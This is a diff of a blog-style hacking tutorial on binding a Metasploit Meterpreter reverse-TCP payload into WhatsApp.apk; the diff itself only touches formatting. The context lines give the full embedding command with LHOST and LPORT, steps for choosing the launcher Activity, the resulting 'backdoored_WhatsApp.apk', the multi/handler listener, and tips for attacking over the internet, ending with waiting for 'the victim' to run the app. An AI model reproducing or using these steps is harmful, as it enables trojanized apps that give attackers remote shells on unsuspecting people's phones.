@@ -8,7 +8,7 @@ tags:
   - Kali Linux
 ---
 
-Hi Fellas! I’m sure most of you, or at least those who have set a foot in the kingdom of hacking, have heard of Metasploit. Don’t be disappointed if you haven’t, because you’re in the right track.
+Hi Fellas! I’m sure most of you, or at least those who have set a foot in the kingdom of hacking, have heard of Metasploit. Don’t be disappointed if you haven’t, because you’re in the right track. 
 
 From Wikipedia,
 
@@ -49,11 +49,11 @@ Open a terminal, and type the following command:
 $ ruby apk-embed-payload.rb WhatsApp.apk -p android/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4895
 ```
 
-In this example I’ve used 192.168.0.104 as the Local IP address, i.e. your IP address and 4895 as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the LPORT can be set to any reasonable port no.
+In this example I’ve used 192.168.0.104 as the Local IP address, i.e. your IP address and 4895 as the port on your Computer through which the Meterpreter payload will connect back to you. Make sure to change it to the appropriate values, especially the IP, the `LPORT` can be set to any reasonable port no.
 
-_NOTE_ — If you are going to conduct this attack over the internet, be sure to put your public IP, not your local IP, in the LHOST option. You also may need to forward the port you’re using for this attack to work properly.
+_NOTE_. If you are going to conduct this attack over the internet, be sure to put your public IP, not your local IP, in the `LHOST` option. You also may need to forward the port you’re using for this attack to work properly.
 
-Once you run the command, if you are lucky, the script will do everything by itself and complete the whole process. But more than often it cannot determine to which Activity of the app it should bind the payload to, so it asks you to select it. In that case, leave the terminal open with the script at the prompt, and browse to /root/original.
+Once you run the command, if you are lucky, the script will do everything by itself and complete the whole process. But more than often it cannot determine to which Activity of the app it should bind the payload to, so it asks you to select it. In that case, leave the terminal open with the script at the prompt, and browse to `/root/original`.
 
 Then open the `AndroidManifest.xml` file using any text editor you like and look for an `<activity>` tag which contains both the texts `.MAIN` and `.LAUNCHER`. When you find that tag, look for the `android:name` attribute of that tag and from there, note the name of that Activity.
 
@@ -61,15 +61,15 @@ At the prompt of the Ruby script, enter the number corresponding to the Activity
 
 This is the hardest step of all, so I’m posting some screenshots to make your life easier.
 
-![Screenshot from 2015-12-12 01-44-01](/images/posts/screenshot-from-2015-12-12-01-44-01.png)
-![Screenshot from 2015-12-12 01-43-27](/images/posts/screenshot-from-2015-12-12-01-43-27.png)
+![Screenshot from 2015-12-12 01-44-01](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-12-01-44-01.png)
+![Screenshot from 2015-12-12 01-43-27](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-12-01-43-27.png)
 
 
 ### PROFIT?!
 
 If you did everything correctly, you should now get an .apk file in your root directory with the name `backdoored_WhatsApp.apk`. It will install and run just like the original app.
 
-As for the listener, you should use multi/handler and set the corresponding options accordingly. Just run the following commands —
+As for the listener, you should use `multi/handler` and set the corresponding options accordingly. Just run the following commands —
 
 ```console
 msfconsole
@@ -82,7 +82,7 @@ exploit
 
 Now wait for the victim to run the app, when he does it, you will get a Meterpreter prompt in the terminal!
 
-![Screenshot from 2015-12-18 14:32:55](/images/posts/screenshot-from-2015-12-18-143255.png)
+![Screenshot from 2015-12-18 14:32:55](/images/posts/metasploit-apk-easily-screenshot-from-2015-12-18-143255.png)
 
 
 ### Note
@@ -94,3 +94,4 @@ If you face any problem, don’t forget to mention it in the comments. I’ll tr
 ### Credits
 
 I found the script from the comments section of a thread in _NullByte_, so thanks to the guy who shared it, I’m sorry I don’t remember which thread it was or who the guy was. And credit of making this script goes to _timwr_ and _Jack64_.
+
